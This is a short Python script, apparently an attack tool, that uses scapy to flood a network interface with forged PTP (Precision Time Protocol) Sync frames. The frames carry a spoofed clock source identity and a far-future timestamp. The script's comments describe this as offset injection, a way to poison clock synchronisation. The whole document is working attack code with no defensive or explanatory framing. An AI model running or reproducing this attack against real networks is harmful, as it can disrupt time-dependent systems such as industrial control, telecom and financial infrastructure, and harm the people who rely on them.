import sys,time,struct
from scapy.all import Ether,Raw,sendp
iface,kind,dur=sys.argv[1],sys.argv[2],int(sys.argv[3])
def sync_frame(seq):
    # PTP v2 Sync: manipulated originTimestamp (far-future seconds) = offset injection
    h=bytearray(34)
    h[0]=0x00; h[1]=0x02; struct.pack_into(">H",h,2,44); h[4]=24
    struct.pack_into(">H",h,6,0x0200)                  # twoStepFlag
    h[20:28]=bytes.fromhex("020000fffe0000aa")         # forged source identity
    struct.pack_into(">H",h,28,1); struct.pack_into(">H",h,30,seq); h[32]=0x00; h[33]=0xFC
    body=bytearray(10); struct.pack_into(">I",body,2,0x7FFFFFFF)   # implausible seconds
    return bytes(h)+bytes(body)
pkt_src="02:00:00:00:00:aa"
t=time.time(); seq=0
while time.time()-t<dur:
    p=Ether(dst="01:1b:19:00:00:00",src=pkt_src,type=0x88F7)/Raw(sync_frame(seq%65536))
    sendp(p,iface=iface,count=8,verbose=0); seq+=8; time.sleep(0.06)
